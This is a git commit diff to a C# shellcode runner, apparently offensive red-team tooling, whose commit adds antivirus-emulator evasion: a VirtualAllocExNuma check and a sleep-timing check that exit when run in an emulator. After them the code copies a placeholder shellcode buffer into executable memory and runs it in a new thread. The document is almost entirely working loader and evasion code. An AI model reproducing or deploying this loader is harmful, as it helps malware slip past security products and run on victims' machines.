804539fa8b5f04e5c49d0621d24c40357399247c
n0isegat3 <jan@cyber-rangers.com>
2022-01-25 11:27:03 +0100

    aded av emulator detections

--- 100-Runners/n0iseCsharpRunner/Program.cs
+++ 100-Runners/n0iseCsharpRunner/Program.cs
@@ -10,20 +10,44 @@ namespace n0iseCsharpRunner
     internal class Program
     {
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
-        uint flAllocationType, uint flProtect);
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
         [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
-        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
-        uint dwCreationFlags, IntPtr lpThreadId);
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
         [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
-        UInt32 dwMilliseconds);
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
         static void Main(string[] args)
         {
+            //detect AV emulator - non-emulated APIs
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            //timer - optional - lapse of 1.5 seconds t2 < 1.5
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+
             //change the payload below:
             byte[] buf = new byte[4] { 0xfc, 0x48, 0x83, 0xe4 };
 
+            //add decoder HERE if payload is encoded.
+
+            //run payload
             int size = buf.Length;
             IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
             Marshal.Copy(buf, 0, addr, size);
